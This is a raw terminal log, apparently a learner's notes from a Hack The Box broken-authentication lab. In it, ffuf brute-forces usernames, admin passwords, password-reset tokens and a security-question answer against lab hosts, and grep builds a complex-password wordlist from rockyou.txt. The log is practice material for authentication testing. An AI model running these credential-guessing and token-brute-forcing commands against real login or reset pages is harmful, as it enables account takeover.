# HTB_Broken_Authentication

[✗]─[user@parrot]─[~/Downloads]
└──╼ $ffuf -w xato-net-10-million-usernames.txt -u http://94.237.56.64:35816/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
─[✗]─[user@parrot]─[/usr/share/wordlists]
└──╼ $sudo su
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ #grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
grep: rockyou.txt: binary file matches
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ #grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt^C
┌─[✗]─[root@parrot]─[/usr/share/wordlists]
└──╼ #grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt^C
┌─[✗]─[root@parrot]─[/usr/share/wordlists]
└──╼ #wc -l custom_wordlist.txt
151647 custom_wordlist.txt
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ #ffuf -w ./custom_wordlist.txt -u http://94.237.121.100:47395/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
──╼ $ffuf -w ./tokens.txt -u http://94.237.60.219:39636/reset_password.php?token=FUZZ -fr "The provided token is invalid"


r@parrot]─[~/Downloads]
└──╼ $ffuf -w ./uk_cities.txt -u http://94.237.54.192:45449/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=1r817v9eur8tihddinbobkfat1" -d "security_response=FUZZ" -fr "Incorrect response."

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.54.192:45449/security_question.php
 :: Wordlist         : FUZZ: /home/user/Downloads/uk_cities.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: PHPSESSID=1r817v9eur8tihddinbobkfat1
 :: Data             : security_response=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Incorrect response.
________________________________________________

Manchester              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 293ms]
Manchester              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 344ms]
Manchester              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 265ms]
Manchester              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 262ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

